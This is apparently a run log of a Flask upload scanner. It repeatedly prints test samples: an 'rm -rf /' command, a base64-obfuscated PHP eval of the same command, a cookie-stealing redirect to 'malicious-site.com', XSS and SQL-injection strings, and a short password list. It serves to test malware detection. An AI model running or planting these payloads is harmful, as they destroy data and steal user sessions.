2025-02-22 20:25:11,416 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,419 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,420 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,423 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,424 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,425 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,426 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,427 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,429 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,430 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,435 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,436 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,438 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:11,440 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:11,441 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:11,444 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:11,445 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,446 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,447 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,449 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,450 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,451 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:11,456 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,457 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:11,459 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,460 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,461 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,462 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,464 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,465 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,467 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,468 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,470 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,472 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,474 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,476 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,478 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,480 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,481 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,483 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,484 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,486 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,487 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,489 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,490 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,491 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,492 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,494 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,495 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,497 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,498 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,500 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,501 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,503 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,505 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,506 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,508 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,510 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,512 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,514 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,516 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:11,518 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:11,519 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:11,521 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:11,523 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:11,524 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:25:11,526 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,528 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:25:11,530 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:25:11,536 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:25:11,536 - [33mPress CTRL+C to quit[0m
2025-02-22 20:25:36,251 - 127.0.0.1 - - [22/Feb/2025 20:25:36] "GET / HTTP/1.1" 200 -
2025-02-22 20:25:42,311 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 20:25:42,311 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py
2025-02-22 20:25:42,311 - Moved create_malicious_xlsx.py to trash due to suspicious content.
2025-02-22 20:25:42,313 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:42,316 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 20:25:42,316 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/app.py
2025-02-22 20:25:42,316 - Moved app.py to trash due to suspicious content.
2025-02-22 20:25:42,317 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 20:25:42,317 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py
2025-02-22 20:25:42,317 - Moved create_malicious_pptx.py to trash due to suspicious content.
2025-02-22 20:25:42,321 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:25:42,321 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx
2025-02-22 20:25:42,321 - Moved malicious.xlsx to trash due to suspicious content.
2025-02-22 20:25:42,327 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:25:42,327 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.pptx
2025-02-22 20:25:42,327 - Moved malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,328 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:42,329 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:25:42,332 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:25:42,333 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:25:42,342 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 20:25:42,342 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 20:25:42,342 - Moved test_doc_hidden.docx to trash due to suspicious content.
2025-02-22 20:25:42,343 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:25:42,357 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:25:42,357 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:25:42,361 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:25:42,362 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:25:42,362 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/1.sql
2025-02-22 20:25:42,362 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:25:42,363 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:25:42,364 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:25:42,366 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:25:42,371 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:25:42,372 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:25:42,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:25:42,376 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:25:42,377 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
